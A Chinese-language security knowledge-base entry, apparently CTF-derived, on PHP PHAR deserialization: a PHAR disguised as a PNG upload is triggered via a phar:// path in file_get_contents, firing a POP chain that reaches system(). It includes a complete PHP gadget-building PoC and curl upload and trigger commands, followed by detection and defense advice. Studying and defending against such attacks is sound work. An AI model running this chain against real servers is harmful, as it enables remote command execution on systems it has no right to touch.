---
id: web-php-deserialization-phar-read-uploaded-image-pop-chain
title: PHAR 反序列化：上传图片后缀文件经 file_get_contents phar:// 触发 POP 链
type: scenario
domain: web
path: web/php/deserialization
technique: phar-wrapper-uploaded-image-pop-chain
tags:
- php
- phar
- deserialization
- file-upload
- file-read
- pop-chain
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:45+08:00'
  notes: 已对照原文 upload/read 源码与 phar gadget 链核对；PHP 8 版本边界已注明；PoC 未复跑。
url: /docs/web/php/deserialization/web-php-deserialization-phar-read-uploaded-image-pop-chain/
draft: false
kb_aliases:
- phar:// 文件读取触发反序列化
- PHAR metadata 反序列化
- 上传 png 触发 phar
- file_get_contents phar
- PHAR POP 链写 flag
---

## 一句话结论

当应用存在任意后缀文件上传，并在另一处把用户可控路径交给 `file_get_contents()` 时，可上传一个伪装成 `.png` 的 PHAR 文件，再传 `filename=phar://uploads/xxx.png`，让 `phar://` 包装器解析 PHAR metadata 并反序列化，触发 `__wakeup → __toString → __invoke → system` 的 POP 链执行命令。

## 原理

- PHAR 是 PHP 的归档容器，`phar://` 包装器按文件内容（stub 中的 `__HALT_COMPILER();` 和 manifest 结构）识别，不要求 `.phar` 后缀；因此 `/uploads/xxx.png` 里的字节仍可被当作 PHAR 解析。
- 应用的上传点只校验扩展名与客户端声明的 MIME：允许 `png`/`jpg` 等图片后缀，并检查 `$_FILES['file']['type']` 是否在允许列表。攻击者把 PHAR 改名为 `1.phar.png`、上传时声明 `image/png`，即可通过；服务端会重命名为 `时间戳_1.phar.png` 并写入 `uploads/`。
- 触发点是文件读取接口：`file_get_contents($filename)` 在路径以 `phar://` 开头时会加载 PHAR 容器；若容器带 metadata，旧版本 PHP 会在解析时对 metadata 执行 `unserialize()`。反序列化触发 gadget 的 `__wakeup()`，进而按对象图调用 `__toString()`/`__invoke()`/普通方法。
- 本题的 gadget：`B::__wakeup()` 输出 `$this->test`（A 对象）触发 `A::__toString()`；`A::__toString()` 调用 `$this->luo`（B 对象）触发 `B::__invoke()`；`B::__invoke()` 调用 `$this->a->rce_me()`；`C::rce_me()` 执行 `system("cat /flag/flag.txt > /tmp/flag")`。
- 上传逻辑会把重命名后的文件名和 MIME 写入 `/tmp/log.txt`，攻击者可通过同一个文件读取接口读取该日志，拿到带时间戳的真实文件名，解决“上传后名字不可预测”的问题。
- 黑名单包含 `../`、`php://`、`%`、`\n`、`filter` 等，但不含 `phar://`，因此 `phar://uploads/...` 可直接通过；`serialized` 参数只是额外 `require` 了 gadget 定义文件，不改变 `file_get_contents` 的触发方式。
- 版本边界：PHP 8.0 起 `phar://` 打开时不再自动反序列化 metadata；本例按旧版本环境成立。若目标为 PHP 8+，需要应用显式对 manifest/metadata 内容 `unserialize()`，或使用仍会反序列化的旧组件/API。

## 触发条件

- 存在允许图片/文档后缀的上传点，且内容不被重新编码，文件名可预测或可泄露。
- 存在把用户可控路径传给 `file_get_contents()`（或 `file_exists`、`filesize`、`getimagesize` 等会打开 `phar://` 的函数）的功能。
- 代码中存在可利用的 gadget 链（`__wakeup`/`__destruct`/`__toString`/`__invoke` 到命令执行或文件写）。
- 目标 PHP 版本仍会在 `phar://` 加载时反序列化 metadata（PHP < 8.0），或应用显式反序列化 PHAR 内容。
- 攻击者能在本地生成 PHAR（`phar.readonly=Off`），并能控制上传文件的扩展名/MIME 声明。

## 利用步骤

1. 读取源码/备份，定位上传点、文件读取点与 gadget 类；确认读取点没有禁用 `phar://`。
2. 本地构造 PHAR：设置 stub 以 `__HALT_COMPILER();` 结尾，把构造好的对象图放进 `setMetadata()`，添加任意文件后 `stopBuffering()`。
3. 把 PHAR 改名为 `.png`（或 `.jpg`），上传时声明对应图片 MIME，绕过扩展名/MIME 校验。
4. 读取 `/tmp/log.txt` 或上传响应，拿到服务端重命名后的真实文件名。
5. 请求 `?filename=phar://uploads/<真实文件名>&serialized=1`，触发 metadata 反序列化与 POP 链；命令结果写到 `/tmp/flag`。
6. 再请求 `?filename=/tmp/flag` 读取命令输出/flag。

## PoC

生成 PHAR（本地 PHP，`phar.readonly=Off`）：

```php
<?php
class A { public $file; public $luo; public function __toString(){ $f=$this->luo; return $f(); } }
class B { public $a; public $test; public function __wakeup(){ echo $this->test; }
           public function __invoke(){ $this->a->rce_me(); } }
class C { public $b; public function rce_me(){ system("cat /flag/flag.txt > /tmp/flag"); } }

$a = new B();
$a->test = new A();
$a->test->luo = new B();
$a->test->luo->a = new C();

$p = new Phar("2.phar");
$p->startBuffering();
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata($a);
$p->addFromString("exp.txt", "test");
$p->stopBuffering();
rename("2.phar", "1.phar.png");
```

上传与触发：

```bash
curl -F 'file=@1.phar.png;type=image/png' http://target/uploads.php
curl 'http://target/index.php?filename=/tmp/log.txt'          # 读取重命名后的文件名
curl 'http://target/index.php?filename=phar://uploads/<name>&serialized=1'
curl 'http://target/index.php?filename=/tmp/flag'
```

## 变体与关联

- 变体：不依赖 metadata 自动反序列化，把序列化 payload 放进 PHAR 内的 `manifest` 文件，触发点显式 `unserialize(file_get_contents('phar://.../manifest'))`。
- 变体：上传后缀换成 `.jpg`、`.gif`、`.zip` 等；若上传点做图片头校验，可在 PHAR 前拼接 GIF89a/PNG 头做 polyglot。
- 变体：触发函数换成 `file_exists`、`filesize`、`getimagesize`、`md5_file`、`copy` 等任意会打开路径的文件函数。
- 关联：[[web-php-deserialization-phar-upload-jpg-wakeup-eval]]（上传 jpg + phar:// + `__wakeup` eval）、[[web-php-deserialization-compressed-phar-include-bypass]]（压缩 PHAR 经 include 解析）；POP 链构造见 [[web-php-deserialization-double-md5-weak-compare-pop-chain]]。
- 边界：PHP 8.0+ 不再自动反序列化 metadata、`phar://` 被禁用、上传内容被重编码、gadget 被移除、或真实文件名不可获取时，本链受阻。

## 检测与防御

- 不要对不可信内容使用 `unserialize()`；不要用 `phar://` 打开用户可控路径。禁用 `phar://` 包装器，或在上传目录上禁止 PHAR 解析。
- 上传文件重命名并做内容魔数校验（不只看扩展名/客户端 MIME），上传目录不可执行，且不要把上传文件路径直接传给文件函数。
- 移除 gadget：禁止在 `__wakeup`/`__destruct`/`__toString`/`__invoke` 中执行命令、写文件或调用用户可控 callable；使用 `allowed_classes` 白名单。
- 及时升级 PHP；PHP 8.0+ 的 metadata 行为可降低该类攻击面，但不能替代输入校验。
- 检测：上传文件中出现 PHAR 魔数/`__HALT_COMPILER();` 结构，即使后缀是 png/jpg；请求参数出现 `phar://`；对上传目录的 `file_get_contents`/`file_exists` 调用；`/tmp/log.txt` 等日志被读取。
